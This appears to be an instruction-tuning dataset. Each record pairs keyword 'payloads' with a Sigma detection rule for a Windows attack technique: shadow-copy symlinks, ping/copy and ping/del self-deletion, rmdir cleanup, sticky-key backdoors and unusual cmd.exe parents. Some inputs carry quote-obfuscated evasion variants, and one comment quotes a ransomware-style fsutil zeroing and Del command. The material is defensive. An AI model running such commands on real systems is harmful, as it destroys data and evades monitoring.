{"instruction": "Write Sigma rule to detect payload:", "input": "mklink HarddiskVolumeShadowCopy", "output": "title: VolumeShadowCopy Symlink Creation Via Mklink\nid: 40b19fa6-d835-400c-b301-41f3a2baacaf\nstatus: stable\ndescription: Shadow Copies storage symbolic link creation using operating systems utilities\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019-10-22\nmodified: 2023-03-06\ntags:\n    - attack.credential-access\n    - attack.t1003.002\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'mklink'\n            - 'HarddiskVolumeShadowCopy'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator working with shadow copies, access for backup purposes\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe ping copy -n -y", "output": "title: Potentially Suspicious Ping/Copy Command Combination\nid: ded2b07a-d12f-4284-9b76-653e37b6c8b0\nstatus: test\ndescription: |\n    Detects uncommon and potentially suspicious one-liner command containing both \"ping\" and \"copy\" at the same time, which is usually used by malware.\nreferences:\n    - Internal Research\nauthor: X__Junior (Nextron Systems)\ndate: 2023-07-18\nmodified: 2024-03-06\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Note: In the case of sysmon and similar logging utilities, see this discussion https://github.com/SigmaHQ/sigma/discussions/4277\n    selection_cmd:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_action:\n        CommandLine|contains|all:\n            - 'ping' # Covers \"ping\" and \"ping.exe\"\n            - 'copy '\n    selection_cli_1:\n        CommandLine|contains|windash: ' -n ' # Count\n    selection_cli_2:\n        CommandLine|contains|windash: ' -y '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe ping copy -n \"-\"\"y\"", "output": "title: Potentially Suspicious Ping/Copy Command Combination\nid: ded2b07a-d12f-4284-9b76-653e37b6c8b0\nstatus: test\ndescription: |\n    Detects uncommon and potentially suspicious one-liner command containing both \"ping\" and \"copy\" at the same time, which is usually used by malware.\nreferences:\n    - Internal Research\nauthor: X__Junior (Nextron Systems)\ndate: 2023-07-18\nmodified: 2024-03-06\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Note: In the case of sysmon and similar logging utilities, see this discussion https://github.com/SigmaHQ/sigma/discussions/4277\n    selection_cmd:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_action:\n        CommandLine|contains|all:\n            - 'ping' # Covers \"ping\" and \"ping.exe\"\n            - 'copy '\n    selection_cli_1:\n        CommandLine|contains|windash: ' -n ' # Count\n    selection_cli_2:\n        CommandLine|contains|windash: ' -y '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd Cmd ping copy -n -y", "output": "title: Potentially Suspicious Ping/Copy Command Combination\nid: ded2b07a-d12f-4284-9b76-653e37b6c8b0\nstatus: test\ndescription: |\n    Detects uncommon and potentially suspicious one-liner command containing both \"ping\" and \"copy\" at the same time, which is usually used by malware.\nreferences:\n    - Internal Research\nauthor: X__Junior (Nextron Systems)\ndate: 2023-07-18\nmodified: 2024-03-06\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Note: In the case of sysmon and similar logging utilities, see this discussion https://github.com/SigmaHQ/sigma/discussions/4277\n    selection_cmd:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_action:\n        CommandLine|contains|all:\n            - 'ping' # Covers \"ping\" and \"ping.exe\"\n            - 'copy '\n    selection_cli_1:\n        CommandLine|contains|windash: ' -n ' # Count\n    selection_cli_2:\n        CommandLine|contains|windash: ' -y '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe ping Cmd.Exe -y -n copy", "output": "title: Potentially Suspicious Ping/Copy Command Combination\nid: ded2b07a-d12f-4284-9b76-653e37b6c8b0\nstatus: test\ndescription: |\n    Detects uncommon and potentially suspicious one-liner command containing both \"ping\" and \"copy\" at the same time, which is usually used by malware.\nreferences:\n    - Internal Research\nauthor: X__Junior (Nextron Systems)\ndate: 2023-07-18\nmodified: 2024-03-06\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Note: In the case of sysmon and similar logging utilities, see this discussion https://github.com/SigmaHQ/sigma/discussions/4277\n    selection_cmd:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_action:\n        CommandLine|contains|all:\n            - 'ping' # Covers \"ping\" and \"ping.exe\"\n            - 'copy '\n    selection_cli_1:\n        CommandLine|contains|windash: ' -n ' # Count\n    selection_cli_2:\n        CommandLine|contains|windash: ' -y '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-n Nul -f -q ping del", "output": "title: Suspicious Ping/Del Command Combination\nid: 54786ddc-5b8a-11ed-9b6a-0242ac120002\nstatus: test\ndescription: Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example\nreferences:\n    - https://blog.sygnia.co/kaseya-ransomware-supply-chain-attack\n    - https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/06/23093553/Common-TTPs-of-the-modern-ransomware_low-res.pdf\n    - https://www.acronis.com/en-us/blog/posts/lockbit-ransomware/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackbyte-exbyte-ransomware\nauthor: Ilya Krestinichev\ndate: 2022-11-03\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Note: In the case of sysmon and similar logging utilities, see this discussion https://github.com/SigmaHQ/sigma/discussions/4277\n    # Example: \"C:\\Windows\\System32\\cmd.exe\"  /C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288 \"C:\\Users\\User\\Desktop\\lockbit\\lockbit.exe\" & Del /f /q \"C:\\Users\\User\\Desktop\\lockbit\\lockbit.exe\".\n    selection_count:\n        CommandLine|contains|windash: ' -n '\n    selection_nul:\n        CommandLine|contains: 'Nul' # Covers \"> Nul\" and \">Nul \"\n    selection_del_param:\n        CommandLine|contains|windash:\n            - ' -f '\n            - ' -q '\n    selection_all:\n        CommandLine|contains|all:\n            - 'ping' # Covers \"ping\" and \"ping.exe\"\n            - 'del '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-n Nul -f -q pi\"ng\" del", "output": "title: Suspicious Ping/Del Command Combination\nid: 54786ddc-5b8a-11ed-9b6a-0242ac120002\nstatus: test\ndescription: Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example\nreferences:\n    - https://blog.sygnia.co/kaseya-ransomware-supply-chain-attack\n    - https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/06/23093553/Common-TTPs-of-the-modern-ransomware_low-res.pdf\n    - https://www.acronis.com/en-us/blog/posts/lockbit-ransomware/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackbyte-exbyte-ransomware\nauthor: Ilya Krestinichev\ndate: 2022-11-03\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Note: In the case of sysmon and similar logging utilities, see this discussion https://github.com/SigmaHQ/sigma/discussions/4277\n    # Example: \"C:\\Windows\\System32\\cmd.exe\"  /C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288 \"C:\\Users\\User\\Desktop\\lockbit\\lockbit.exe\" & Del /f /q \"C:\\Users\\User\\Desktop\\lockbit\\lockbit.exe\".\n    selection_count:\n        CommandLine|contains|windash: ' -n '\n    selection_nul:\n        CommandLine|contains: 'Nul' # Covers \"> Nul\" and \">Nul \"\n    selection_del_param:\n        CommandLine|contains|windash:\n            - ' -f '\n            - ' -q '\n    selection_all:\n        CommandLine|contains|all:\n            - 'ping' # Covers \"ping\" and \"ping.exe\"\n            - 'del '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-n del Nul -f -q ping", "output": "title: Suspicious Ping/Del Command Combination\nid: 54786ddc-5b8a-11ed-9b6a-0242ac120002\nstatus: test\ndescription: Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example\nreferences:\n    - https://blog.sygnia.co/kaseya-ransomware-supply-chain-attack\n    - https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/06/23093553/Common-TTPs-of-the-modern-ransomware_low-res.pdf\n    - https://www.acronis.com/en-us/blog/posts/lockbit-ransomware/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackbyte-exbyte-ransomware\nauthor: Ilya Krestinichev\ndate: 2022-11-03\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Note: In the case of sysmon and similar logging utilities, see this discussion https://github.com/SigmaHQ/sigma/discussions/4277\n    # Example: \"C:\\Windows\\System32\\cmd.exe\"  /C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288 \"C:\\Users\\User\\Desktop\\lockbit\\lockbit.exe\" & Del /f /q \"C:\\Users\\User\\Desktop\\lockbit\\lockbit.exe\".\n    selection_count:\n        CommandLine|contains|windash: ' -n '\n    selection_nul:\n        CommandLine|contains: 'Nul' # Covers \"> Nul\" and \">Nul \"\n    selection_del_param:\n        CommandLine|contains|windash:\n            - ' -f '\n            - ' -q '\n    selection_all:\n        CommandLine|contains|all:\n            - 'ping' # Covers \"ping\" and \"ping.exe\"\n            - 'del '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe rmdir /s /q", "output": "title: Directory Removal Via Rmdir\nid: 41ca393d-538c-408a-ac27-cf1e038be80c\nstatus: test\ndescription: |\n    Detects execution of the builtin \"rmdir\" command in order to delete directories.\n    Adversaries may delete files left behind by the actions of their intrusion activity.\n    Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\n    Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113\ndate: 2022-01-15\nmodified: 2023-03-07\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_rmdir:\n        CommandLine|contains: 'rmdir'\n    selection_flags:\n        CommandLine|contains:\n            - '/s'\n            - '/q'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe \\\"r\\\"\\\"m\\\"\\\"d\\\"\\\"i\\\"\\\"r\\\" /s /q", "output": "title: Directory Removal Via Rmdir\nid: 41ca393d-538c-408a-ac27-cf1e038be80c\nstatus: test\ndescription: |\n    Detects execution of the builtin \"rmdir\" command in order to delete directories.\n    Adversaries may delete files left behind by the actions of their intrusion activity.\n    Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\n    Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113\ndate: 2022-01-15\nmodified: 2023-03-07\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_rmdir:\n        CommandLine|contains: 'rmdir'\n    selection_flags:\n        CommandLine|contains:\n            - '/s'\n            - '/q'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe rmdir /s -q", "output": "title: Directory Removal Via Rmdir\nid: 41ca393d-538c-408a-ac27-cf1e038be80c\nstatus: test\ndescription: |\n    Detects execution of the builtin \"rmdir\" command in order to delete directories.\n    Adversaries may delete files left behind by the actions of their intrusion activity.\n    Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\n    Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113\ndate: 2022-01-15\nmodified: 2023-03-07\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_rmdir:\n        CommandLine|contains: 'rmdir'\n    selection_flags:\n        CommandLine|contains:\n            - '/s'\n            - '/q'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd Cmd rmdir /s /q", "output": "title: Directory Removal Via Rmdir\nid: 41ca393d-538c-408a-ac27-cf1e038be80c\nstatus: test\ndescription: |\n    Detects execution of the builtin \"rmdir\" command in order to delete directories.\n    Adversaries may delete files left behind by the actions of their intrusion activity.\n    Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\n    Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113\ndate: 2022-01-15\nmodified: 2023-03-07\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_rmdir:\n        CommandLine|contains: 'rmdir'\n    selection_flags:\n        CommandLine|contains:\n            - '/s'\n            - '/q'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe rmdir /s /q", "output": "title: Directory Removal Via Rmdir\nid: 41ca393d-538c-408a-ac27-cf1e038be80c\nstatus: test\ndescription: |\n    Detects execution of the builtin \"rmdir\" command in order to delete directories.\n    Adversaries may delete files left behind by the actions of their intrusion activity.\n    Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\n    Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113\ndate: 2022-01-15\nmodified: 2023-03-07\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_rmdir:\n        CommandLine|contains: 'rmdir'\n    selection_flags:\n        CommandLine|contains:\n            - '/s'\n            - '/q'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winlogon.exe \\cmd.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\rundll32.exe \\wscript.exe \\wt.exe sethc.exe utilman.exe osk.exe Magnify.exe Narrator.exe DisplaySwitch.exe", "output": "title: Sticky Key Like Backdoor Execution\nid: 2fdefcb3-dbda-401e-ae23-f0db027628bc\nrelated:\n    - id: baca5663-583c-45f9-b5dc-ea96a22ce542\n      type: derived\nstatus: test\ndescription: Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen\nreferences:\n    - https://learn.microsoft.com/en-us/archive/blogs/jonathantrull/detecting-sticky-key-backdoors\nauthor: Florian Roth (Nextron Systems), @twjackomo, Jonhnathan Ribeiro, oscd.community\ndate: 2018-03-15\nmodified: 2023-03-07\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.008\n    - car.2014-11-003\n    - car.2014-11-008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\winlogon.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n            - '\\wt.exe'\n        CommandLine|contains:\n            - 'sethc.exe'\n            - 'utilman.exe'\n            - 'osk.exe'\n            - 'Magnify.exe'\n            - 'Narrator.exe'\n            - 'DisplaySwitch.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winlogon.exe \\cmd.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\rundll32.exe \\wscript.exe \\wt.exe sethc.exe utilman.exe osk.exe Magnify.exe \"Narrat\"or.exe DisplaySwitch.exe", "output": "title: Sticky Key Like Backdoor Execution\nid: 2fdefcb3-dbda-401e-ae23-f0db027628bc\nrelated:\n    - id: baca5663-583c-45f9-b5dc-ea96a22ce542\n      type: derived\nstatus: test\ndescription: Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen\nreferences:\n    - https://learn.microsoft.com/en-us/archive/blogs/jonathantrull/detecting-sticky-key-backdoors\nauthor: Florian Roth (Nextron Systems), @twjackomo, Jonhnathan Ribeiro, oscd.community\ndate: 2018-03-15\nmodified: 2023-03-07\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.008\n    - car.2014-11-003\n    - car.2014-11-008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\winlogon.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n            - '\\wt.exe'\n        CommandLine|contains:\n            - 'sethc.exe'\n            - 'utilman.exe'\n            - 'osk.exe'\n            - 'Magnify.exe'\n            - 'Narrator.exe'\n            - 'DisplaySwitch.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winlogon \\cmd \\cscript \\mshta \\powershell \\pwsh \\regsvr32 \\rundll32 \\wscript \\wt sethc utilman osk Magnify Narrator DisplaySwitch", "output": "title: Sticky Key Like Backdoor Execution\nid: 2fdefcb3-dbda-401e-ae23-f0db027628bc\nrelated:\n    - id: baca5663-583c-45f9-b5dc-ea96a22ce542\n      type: derived\nstatus: test\ndescription: Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen\nreferences:\n    - https://learn.microsoft.com/en-us/archive/blogs/jonathantrull/detecting-sticky-key-backdoors\nauthor: Florian Roth (Nextron Systems), @twjackomo, Jonhnathan Ribeiro, oscd.community\ndate: 2018-03-15\nmodified: 2023-03-07\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.008\n    - car.2014-11-003\n    - car.2014-11-008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\winlogon.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n            - '\\wt.exe'\n        CommandLine|contains:\n            - 'sethc.exe'\n            - 'utilman.exe'\n            - 'osk.exe'\n            - 'Magnify.exe'\n            - 'Narrator.exe'\n            - 'DisplaySwitch.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\winlogon.exe \\cmd.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\rundll32.exe \\wscript.exe \\wt.exe sethc.exe utilman.exe osk.exe Magnify.exe Narrator.exe DisplaySwitch.exe", "output": "title: Sticky Key Like Backdoor Execution\nid: 2fdefcb3-dbda-401e-ae23-f0db027628bc\nrelated:\n    - id: baca5663-583c-45f9-b5dc-ea96a22ce542\n      type: derived\nstatus: test\ndescription: Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen\nreferences:\n    - https://learn.microsoft.com/en-us/archive/blogs/jonathantrull/detecting-sticky-key-backdoors\nauthor: Florian Roth (Nextron Systems), @twjackomo, Jonhnathan Ribeiro, oscd.community\ndate: 2018-03-15\nmodified: 2023-03-07\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.008\n    - car.2014-11-003\n    - car.2014-11-008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\winlogon.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n            - '\\wt.exe'\n        CommandLine|contains:\n            - 'sethc.exe'\n            - 'utilman.exe'\n            - 'osk.exe'\n            - 'Magnify.exe'\n            - 'Narrator.exe'\n            - 'DisplaySwitch.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\csrss.exe \\ctfmon.exe \\dllhost.exe \\epad.exe \\FlashPlayerUpdateService.exe \\GoogleUpdate.exe \\jucheck.exe \\jusched.exe \\LogonUI.exe \\lsass.exe \\regsvr32.exe \\SearchIndexer.exe \\SearchProtocolHost.exe \\SIHClient.exe \\sihost.exe \\slui.exe \\spoolsv.exe \\sppsvc.exe \\taskhostw.exe \\unsecapp.exe \\WerFault.exe \\wermgr.exe \\wlanext.exe \\WUDFHost.exe", "output": "title: Unusual Parent Process For Cmd.EXE\nid: 4b991083-3d0e-44ce-8fc4-b254025d8d4b\nstatus: test\ndescription: Detects suspicious parent process for cmd.exe\nreferences:\n    - https://www.elastic.co/guide/en/security/current/unusual-parent-process-for-cmd.exe.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-21\nmodified: 2023-12-05\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\cmd.exe'\n        ParentImage|endswith:\n            - '\\csrss.exe'\n            - '\\ctfmon.exe'\n            - '\\dllhost.exe'\n            - '\\epad.exe'\n            - '\\FlashPlayerUpdateService.exe'\n            - '\\GoogleUpdate.exe'\n            - '\\jucheck.exe'\n            - '\\jusched.exe'\n            - '\\LogonUI.exe'\n            - '\\lsass.exe'\n            - '\\regsvr32.exe'\n            - '\\SearchIndexer.exe'\n            - '\\SearchProtocolHost.exe'\n            - '\\SIHClient.exe'\n            - '\\sihost.exe'\n            - '\\slui.exe'\n            - '\\spoolsv.exe'\n            - '\\sppsvc.exe'\n            - '\\taskhostw.exe'\n            - '\\unsecapp.exe'\n            - '\\WerFault.exe'\n            - '\\wermgr.exe'\n            - '\\wlanext.exe'\n            - '\\WUDFHost.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\csrss.exe \\ctfmon.exe \\dllhost.exe \\epad.exe \\FlashPlayerUpdateService.exe \\GoogleUpdate.exe \\\"\\jucheck.exe\\\" \\jusched.exe \\LogonUI.exe \\lsass.exe \\regsvr32.exe \\SearchIndexer.exe \\SearchProtocolHost.exe \\SIHClient.exe \\sihost.exe \\slui.exe \\spoolsv.exe \\sppsvc.exe \\taskhostw.exe \\unsecapp.exe \\WerFault.exe \\wermgr.exe \\wlanext.exe \\WUDFHost.exe", "output": "title: Unusual Parent Process For Cmd.EXE\nid: 4b991083-3d0e-44ce-8fc4-b254025d8d4b\nstatus: test\ndescription: Detects suspicious parent process for cmd.exe\nreferences:\n    - https://www.elastic.co/guide/en/security/current/unusual-parent-process-for-cmd.exe.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-21\nmodified: 2023-12-05\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\cmd.exe'\n        ParentImage|endswith:\n            - '\\csrss.exe'\n            - '\\ctfmon.exe'\n            - '\\dllhost.exe'\n            - '\\epad.exe'\n            - '\\FlashPlayerUpdateService.exe'\n            - '\\GoogleUpdate.exe'\n            - '\\jucheck.exe'\n            - '\\jusched.exe'\n            - '\\LogonUI.exe'\n            - '\\lsass.exe'\n            - '\\regsvr32.exe'\n            - '\\SearchIndexer.exe'\n            - '\\SearchProtocolHost.exe'\n            - '\\SIHClient.exe'\n            - '\\sihost.exe'\n            - '\\slui.exe'\n            - '\\spoolsv.exe'\n            - '\\sppsvc.exe'\n            - '\\taskhostw.exe'\n            - '\\unsecapp.exe'\n            - '\\WerFault.exe'\n            - '\\wermgr.exe'\n            - '\\wlanext.exe'\n            - '\\WUDFHost.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd \\csrss \\ctfmon \\dllhost \\epad \\FlashPlayerUpdateService \\GoogleUpdate \\jucheck \\jusched \\LogonUI \\lsass \\regsvr32 \\SearchIndexer \\SearchProtocolHost \\SIHClient \\sihost \\slui \\spoolsv \\sppsvc \\taskhostw \\unsecapp \\WerFault \\wermgr \\wlanext \\WUDFHost", "output": "title: Unusual Parent Process For Cmd.EXE\nid: 4b991083-3d0e-44ce-8fc4-b254025d8d4b\nstatus: test\ndescription: Detects suspicious parent process for cmd.exe\nreferences:\n    - https://www.elastic.co/guide/en/security/current/unusual-parent-process-for-cmd.exe.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-21\nmodified: 2023-12-05\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\cmd.exe'\n        ParentImage|endswith:\n            - '\\csrss.exe'\n            - '\\ctfmon.exe'\n            - '\\dllhost.exe'\n            - '\\epad.exe'\n            - '\\FlashPlayerUpdateService.exe'\n            - '\\GoogleUpdate.exe'\n            - '\\jucheck.exe'\n            - '\\jusched.exe'\n            - '\\LogonUI.exe'\n            - '\\lsass.exe'\n            - '\\regsvr32.exe'\n            - '\\SearchIndexer.exe'\n            - '\\SearchProtocolHost.exe'\n            - '\\SIHClient.exe'\n            - '\\sihost.exe'\n            - '\\slui.exe'\n            - '\\spoolsv.exe'\n            - '\\sppsvc.exe'\n            - '\\taskhostw.exe'\n            - '\\unsecapp.exe'\n            - '\\WerFault.exe'\n            - '\\wermgr.exe'\n            - '\\wlanext.exe'\n            - '\\WUDFHost.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
